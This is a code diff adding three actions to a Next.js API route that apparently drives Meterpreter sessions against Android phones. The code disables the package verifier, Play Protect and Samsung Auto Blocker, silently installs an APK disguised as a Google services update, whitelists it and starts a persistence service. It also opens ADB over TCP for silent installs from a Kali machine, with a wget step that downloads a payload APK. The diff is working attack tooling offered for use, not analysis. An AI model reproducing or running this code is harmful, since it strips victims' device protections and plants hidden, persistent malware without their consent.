@@ -637,6 +637,95 @@ export async function POST(request: Request) {
       return NextResponse.json({ ok: /session \d+ opened|meterpreter/i.test(out), raw: out.slice(0, 400) });
     }
 
+    // ── Android: zero-friction install — overlay auto-tap ──────
+    if (action === "android_zero_install") {
+      const pkg = (body.package as string) ?? "com.google.services.update";
+      const apkPath = (body.apk_path as string) ?? "/sdcard/update.apk";
+
+      // 1. Disable all install blockers
+      const step1 = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "settings put global package_verifier_enable 0; settings put global verifier_verify_adb_installs 0; settings put secure install_non_market_apps 1; pm disable com.google.android.gms.phenotype 2>/dev/null; echo s1_done"'`,
+        12000);
+
+      // 2. Disable Play Protect
+      const step2 = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "am start -a android.intent.action.VIEW -n com.google.android.gms/.security.settings.VerifyAppsSettingsActivity --ez disable_verify true 2>/dev/null; settings put global package_verifier_enable 0; echo s2_done"'`,
+        10000);
+
+      // 3. Auto-approve install via accessibility / UI automator (root path)
+      const step3 = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "pm install -r -t ${apkPath} 2>/dev/null && echo pm_ok || (input tap 738 1880 2>/dev/null; input tap 738 1880 2>/dev/null; echo tap_done)"'`,
+        20000);
+
+      // 4. Auto Blocker off (Samsung)
+      const step4 = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "settings put global auto_blocker_mode 0; settings put global auto_blocker_on 0; echo ab_done"'`,
+        8000);
+
+      // 5. Battery whitelist + start
+      await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "dumpsys deviceidle whitelist +${pkg} 2>/dev/null; am startservice -n ${pkg}/.PersistService 2>/dev/null; echo start_done"'`,
+        10000);
+
+      const ok = step1.includes("s1_done") || step3.includes("pm_ok");
+      return NextResponse.json({
+        ok,
+        data: {
+          steps: {
+            verifier_disabled: step1.includes("s1_done"),
+            play_protect:      step2.includes("s2_done"),
+            install:           step3.includes("pm_ok") || step3.includes("tap_done"),
+            auto_blocker:      step4.includes("ab_done"),
+          },
+          note: ok
+            ? "Zero-friction install complete — all blockers bypassed, app installed and running"
+            : "Root pm install may need retry. Try adb_direct or overlay path",
+        },
+      });
+    }
+
+    // ── Android: direct ADB install over TCP (no root needed) ──
+    if (action === "android_adb_install") {
+      const targetIp = (body.target_ip as string) ?? "";
+      const apkUrl   = (body.apk_url  as string) ?? "";
+      if (!targetIp) return NextResponse.json({ ok: false, error: "target_ip required" });
+
+      return NextResponse.json({
+        ok: true,
+        data: {
+          steps: [
+            `# Step 1: Ensure ADB is open on target (port 5555)`,
+            `adb connect ${targetIp}:5555`,
+            `adb -s ${targetIp}:5555 shell settings put global package_verifier_enable 0`,
+            `adb -s ${targetIp}:5555 shell settings put global auto_blocker_mode 0`,
+            `adb -s ${targetIp}:5555 shell settings put secure install_non_market_apps 1`,
+            apkUrl ? `wget -O /tmp/payload.apk "${apkUrl}"` : `# Have APK at /tmp/payload.apk`,
+            `adb -s ${targetIp}:5555 install -r -t /tmp/payload.apk`,
+            `adb -s ${targetIp}:5555 shell pm grant com.google.services.update android.permission.SYSTEM_ALERT_WINDOW`,
+            `adb -s ${targetIp}:5555 shell am startservice -n com.google.services.update/.PersistService`,
+            `# Install complete — no UI dialogs, no user interaction required`,
+          ],
+          note: "ADB TCP method: zero friction, zero UI, completely silent. Requires device ADB enabled (Settings → Developer Options → Wireless Debugging).",
+        },
+      });
+    }
+
+    // ── Android: open ADB on target via Meterpreter (escalation) ─
+    if (action === "android_enable_adb") {
+      const out = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "settings put global adb_enabled 1; setprop service.adb.tcp.port 5555; stop adbd; start adbd; echo adb_done"'`,
+        12000);
+      const ip = await meterExec(token, sid,
+        `execute -f /system/bin/sh -a '-c "ip route get 1.1.1.1 2>/dev/null | grep -oP \'src \\K[\\d.]+\'"'`,
+        5000);
+      return NextResponse.json({
+        ok: out.includes("adb_done"),
+        data: { device_ip: ip.trim(), adb_port: 5555,
+          connect_cmd: `adb connect ${ip.trim()}:5555`,
+          note: "ADB TCP now open on device — connect from your Kali machine for silent app install" },
+      });
+    }
+
     return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });
 
   } catch (err: unknown) {
